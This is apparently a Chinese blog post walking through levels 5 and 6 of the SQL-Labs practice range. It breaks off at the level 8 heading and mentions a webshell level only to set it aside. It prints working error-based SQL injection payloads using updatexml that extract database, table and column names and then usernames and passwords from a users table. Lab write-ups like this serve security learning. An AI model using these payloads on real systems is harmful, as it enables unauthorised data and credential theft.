---
title:  "SQL-Labs 5-10"
published: 2025-12-04 
description: "sql-labs注入1-4关的解题过程"
image: "./image.png"
tags: ["sql注入","web安全","靶场"]
category: 网安
draft: false
---
# 本篇文章是关与sal-labs靶场5-10关的解题过程。其知识点与sql注入相关。
## 第五关

首先我们 ?id=1 发现显示 you are in ，需要我们进行盲注。![alt text](Snipaste_2025-12-04_14-11-53.png)

尝试?id=1'根据报错确定用单引号闭合![alt text](Snipaste_2025-12-04_14-12-14.png)

然后我们继续尝试爆出它的数据库名?id=1' and updatexml(1,concat(0x7e,database()),1) --+ ![alt text](Snipaste_2025-12-04_14-15-21.png)

接着尝试爆出所有表名?id=1' and updatexml(1,substr(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1,31),1) --+ 

然后继续尝试爆出users表的列名?id=1' and updatexml(1,substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')),1,31),1) --+ ![alt text](Snipaste_2025-12-04_14-29-38-1.png)

最后尝试爆出账号和密码，中间用id隔开
?id=1' and updatexml(1,substr(concat(0x7e,(select group_concat(username,id,password) from users)),1,31),1) --+ ![alt text](Snipaste_2025-12-04_14-31-01.png) 对于不过updatexml函数一次最多只能爆出32个字符，故我们可以修改substr的第二个参数让它爆出后续的数据。

## 第六关
先尝试?id=1' 结果无报错显示，然后用?id=1"结果出现报错，根据界面显示确定用双引号来闭合。![alt text](Snipaste_2025-12-04_14-47-07.png)
接下来的步骤与第五关一致，不过多赘述。
## 第七关
本题涉及一句话木马暂时放一边。
## 第八关
